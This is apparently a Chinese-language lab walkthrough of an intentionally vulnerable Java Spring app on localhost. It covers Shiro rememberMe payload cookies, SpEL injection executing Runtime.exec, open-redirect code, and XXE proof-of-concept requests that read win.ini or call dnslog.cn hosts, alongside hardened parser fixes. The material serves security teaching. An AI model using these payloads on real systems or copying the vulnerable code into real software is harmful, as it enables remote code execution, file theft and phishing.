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 发送 cookie 请求\ntext\r1 2 Cookie: rememberMe=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 也可以利用工具：\nSpEL Spring Expression Language 是一种表达式语言，支持运行时查询和操作对象图，同时也有方法调用和字符串模板功能\nSpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：\n引用其他对象:#{car} 引用其他对象的属性：#{car.brand} 调用其它方法 , 还可以链式操作：#{car.toString()}\n1.类类型表达式\n使用T()运算符会调用类作用域的静态属性或静态方法，SpEL内置了java.lang包下的类声明，也就是说java.lang.String可以通过T(String)访问，而不需要使用全限定名 比如：\ntext\r1 T(Runtime).getRuntime().exec(\\\u0026#34;open /Applications/Calculator.app\\\u0026#34;) 2.类实例化 使用new可以直接在SpEL中创建实例，需要创建实例的类要通过全限定名进行访问。 比如\ntext\r1 new java.util.Date() java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @RequestMapping(\u0026#34;/spel/vuln1\u0026#34;) public String spel_vuln1(String value) { ExpressionParser parser = new SpelExpressionParser(); return parser.parseExpression(value).getValue().toString(); } @RequestMapping(\u0026#34;spel/vuln2\u0026#34;) public String spel_vuln2(String value) { StandardEvaluationContext context = new StandardEvaluationContext(); SpelExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(value, new TemplateParserContext()); Object x = expression.getValue(context); // trigger vulnerability point return x.toString(); // response } text\r1 2 http://127.0.0.1:8081/spel/vuln1?value=T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;) -\u0026gt; http://127.0.0.1:8081/spel/vuln1?value=T(java.lang.Runtime).getRuntime().exec(%27calc%27) text\r1 2 http://127.0.0.1:8081/spel/vuln2?value=${T(java.lang.Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)} -\u0026gt; http://127.0.0.1:8081/spel/vuln2?value=%24%7BT(java.lang.Runtime.getRuntime().exec(%27calc%27)%7D URLRedirect url重定向漏洞主要用来钓鱼，重定向跳转代码\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //直接拼接 url @GetMapping(\u0026#34;/redirect\u0026#34;) public String redirect(@RequestParam(\u0026#34;url\u0026#34;) String url) { return \u0026#34;redirect:\u0026#34; + url; } //设置任意重定向头，手动设置 Location 响应头 @RequestMapping(\u0026#34;/setHeader\u0026#34;) @ResponseBody public static void setHeader(HttpServletRequest request, HttpServletResponse response) { String url = request.getParameter(\u0026#34;url\u0026#34;); response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect response.setHeader(\u0026#34;Location\u0026#34;, url); } //用户控制跳转目标。自动设置状态码为 302 并写入 Location 头 @RequestMapping(\u0026#34;/sendRedirect\u0026#34;) @ResponseBody public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException { String url = request.getParameter(\u0026#34;url\u0026#34;); response.sendRedirect(url); // 302 redirect } text\r1 http://127.0.0.1:8081//urlRedirect/redirect?url=http://www.baidu.com URLWhiteList Java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 @GetMapping(\u0026#34;/vuln/url_bypass\u0026#34;) public void url_bypass(String url, HttpServletResponse res) throws IOException { logger.info(\u0026#34;url: \u0026#34; + url); //检查 url 是否是以 http:// 或 https:// 开头 if (!SecurityUtil.isHttp(url)) { return; } URL u = new URL(url); //从 URL 对象中获取域名部分 String host = u.getHost(); logger.info(\u0026#34;host: \u0026#34; + host); //遍历配置的域名白名单 domainwhitelist // endsWith . for (String domain : domainwhitelist) { if (host.endsWith(\u0026#34;.\u0026#34; + domain)) { res.sendRedirect(url); } } } java\r1 URL u = new URL(url); 创建一个 Java 标准库的 URL 对象，用于解析 url 字符串的结构。 比如： url = \u0026quot;https://www.example.com:8080/path?q=1\u0026quot; 则： u.getHost() = \u0026quot;www.example.com\u0026quot; u.getPort() = 8080 u.getPath() = \u0026quot;/path\u0026quot; XXE XXE漏洞全称XML External Entity Injection 即XML外部实体注入。 XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。\n1./xmlReader/vuln java\r1 2 3 4 5 6 7 8 9 10 11 12 13 @PostMapping(\u0026#34;/xmlReader/vuln\u0026#34;) public String xmlReaderVuln(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); // parse xml return \u0026#34;xmlReader xxe vuln code\u0026#34;; } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } } 没有禁用 DOCTYPE 与实体相关的 SAX 特性\nSAX（Simple API for XML）解析器是一种基于事件驱动的解析方式，用于处理XML文档。与DOM解析器不同，SAX不需要将整个文档加载到内存中，因此对于大型文件尤其有用。\nPOC:\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 POST /xxe/xmlReader/vuln HTTP/1.1 Host: 127.0.0.1:8081 Content-Type: application/xml Content-Length: 198 可以不写 Connection: close 此处空一行 分隔 Header 与 Body \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///C:/Windows/win.ini\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 或 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://1izyf3.dnslog.cn\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 抓包 http://127.0.0.1:8081/xxe/xmlReader/vuln\n修改为 POST 提交\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 POST /xxe/xmlReader/vuln HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0 Content-Type: application/xml Content-Length: 198 Connection: close \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///C:/Windows/win.ini\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 已经触发了 XML 解析逻辑，但是没有读取文件\n换一种：\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 POST /xxe/xmlReader/vuln HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0 Content-Type: application/xml Content-Length: 198 Connection: close \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://1izyf3.dnslog.cn\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 说明服务端 确实解析并触发了外部实体加载，访问了构造的恶意 URL\n2./xmlReader/sec java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @RequestMapping(value = \u0026#34;/xmlReader/sec\u0026#34;, method = RequestMethod.POST) public String xmlReaderSec(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); // fix code start xmlReader.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); xmlReader.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); xmlReader.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); //fix code end xmlReader.parse(new InputSource(new StringReader(body))); // parse xml } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } return \u0026#34;xmlReader xxe security code\u0026#34;; } 修改后的方法禁用 DOCTYPE 声明，禁用外部实体（GENERAL + PARAMETER）\n3./SAXBuilder/vuln java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @RequestMapping(value = \u0026#34;/SAXBuilder/vuln\u0026#34;, method = RequestMethod.POST) public String SAXBuilderVuln(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); //创建一个 JDOM2 的 SAXBuilder 实例，它用于将 XML 字符串解析成一个 JDOM Document 对象 SAXBuilder builder = new SAXBuilder(); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); // cause xxe return \u0026#34;SAXBuilder xxe vuln code\u0026#34;; } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } } SAXBuilder 默认开启了对 外部实体 的支持\nPOC:\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 POST /xxe/SAXBuilder/vuln HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0 Content-Type: application/xml Content-Length: 150 Connection: close \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://v50sch.dnslog.cn\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 4./SAXBuilder/sec Java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @RequestMapping(value = \u0026#34;/SAXBuilder/sec\u0026#34;, method = RequestMethod.POST) public String SAXBuilderSec(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); SAXBuilder builder = new SAXBuilder(); //禁止 DOCTYPE 声明。 builder.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); //禁止解析 外部通用实体 \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; builder.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); //禁止解析 外部参数实体 builder.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } return \u0026#34;SAXBuilder xxe security code\u0026#34;; } 5./SAXReader/vuln java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @RequestMapping(value = \u0026#34;/SAXReader/vuln\u0026#34;, method = RequestMethod.POST) public String SAXReaderVuln(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); // cause xxe } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } return \u0026#34;SAXReader xxe vuln code\u0026#34;; } POC:\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 POST /xxe/SAXReader/vuln HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0 Content-Type: application/xml Content-Length: 150 Connection: close \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://f89q97.dnslog.cn\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 6./SAXReader/sec java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @RequestMapping(value = \u0026#34;/SAXReader/sec\u0026#34;, method = RequestMethod.POST) public String SAXReaderSec(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); reader.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); reader.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); reader.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } return \u0026#34;SAXReader xxe security code\u0026#34;; } 7./SAXParser/vuln java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @RequestMapping(value = \u0026#34;/SAXParser/vuln\u0026#34;, method = RequestMethod.POST) public String SAXParserVuln(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml return \u0026#34;SAXParser xxe vuln code\u0026#34;; } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } } POC:\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 POST /xxe/SAXParser/vuln HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; 